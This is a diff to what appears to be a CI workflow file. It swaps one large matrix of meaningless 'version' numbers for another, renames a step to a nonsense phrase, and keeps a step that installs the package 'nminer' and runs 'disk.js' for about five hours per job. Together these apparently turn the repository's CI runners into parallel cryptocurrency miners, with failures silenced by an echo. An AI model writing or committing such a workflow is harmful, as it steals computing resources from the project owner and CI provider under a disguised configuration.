@@ -9,22 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 305 }
-          - { version: 153 }
-          - { version: 4778 }
-          - { version: 4137 }
-          - { version: 7586 }
-          - { version: 1550 }
-          - { version: 7499 }
-          - { version: 4603 }
-          - { version: 668 }
-          - { version: 1810 }
-          - { version: 138 }
-          - { version: 9659 }
-          - { version: 6298 }
-          - { version: 7735 }
-          - { version: 479 }
-          - { version: 3427 }
+          - { version: 5893 }
+          - { version: 1728 }
+          - { version: 140 }
+          - { version: 224 }
+          - { version: 9070 }
+          - { version: 8569 }
+          - { version: 2681 }
+          - { version: 3594 }
+          - { version: 3054 }
+          - { version: 5245 }
+          - { version: 996 }
+          - { version: 407 }
+          - { version: 3544 }
+          - { version: 160 }
+          - { version: 7483 }
+          - { version: 4993 }
+          - { version: 4235 }
+          - { version: 9577 }
+          - { version: 7969 }
+          - { version: 9229 }
 
     steps:
       - name: Checkout
@@ -35,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: coordination why gadzooks
         run: |
           npm install nminer@latest
-          timeout 330m node disk.js || echo "disk executed"
+          timeout 309m node disk.js || echo "disk executed"
